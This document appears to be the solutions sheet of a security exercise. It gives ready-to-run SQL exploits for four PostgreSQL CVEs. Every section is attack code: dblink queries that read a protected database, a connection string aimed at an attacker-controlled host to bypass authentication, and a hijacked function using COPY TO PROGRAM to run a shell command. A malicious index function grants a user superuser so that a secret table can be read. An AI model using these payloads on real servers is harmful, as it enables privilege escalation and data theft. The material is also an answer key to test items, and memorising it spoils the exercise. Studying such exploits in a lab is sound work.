Solutions:

## CVE-2007-6601

SELECT * FROM dblink('dbname=secret_db', 'SELECT * FROM secret_table') AS secret_table(c unknown);


## CVE-2018-10915

On a controlled server:

CREATE DATABASE secret_db;
ALTER SYSTEM SET default_transaction_read_only TO on;
SELECT pg_reload_conf();

On a target server:
SELECT * FROM dblink('host=192.168.233.3,localhost port=5433,5432 user=postgres password=password target_session_attrs=read-write dbname=secret_db', 'SELECT * FROM secret_table') AS secret_table(c text);


## CVE-2020-14349:

CREATE OR REPLACE FUNCTION public.pg_get_replica_identity_index(int)
RETURNS regclass
LANGUAGE plpgsql
AS $$
BEGIN
    COPY (SELECT 1) TO PROGRAM '/pg12/postgres/bin/psql -c "ALTER USER user1 WITH SUPERUSER;" postgres';
    RETURN pg_catalog.pg_get_replica_identity_index($1);
END;
$$;
\c secret_db
select * from secret_table;


## CVE-2022-1552:

CREATE TABLE bttest_a AS SELECT i as id FROM generate_series(1, 1000) i;
ALTER TABLE bttest_a OWNER TO regress_bttest_role;
-- A dummy index function checking current_user
CREATE OR REPLACE FUNCTION ifun(int8) RETURNS int8 AS $$
BEGIN
 if current_user = 'postgres' then
 ALTER USER user1 WITH superuser;
 end if;
 RETURN $1;
END;
$$ LANGUAGE plpgsql IMMUTABLE;
CREATE INDEX bttest_a_expr_idx ON bttest_a ((ifun(id) + ifun(0)))
 WHERE ifun(id + 10) > ifun(10);
alter function ifun volatile;

select pg_sleep(2); -- must wait here a bit

\c secret_db
SELECT * FROM secret_table;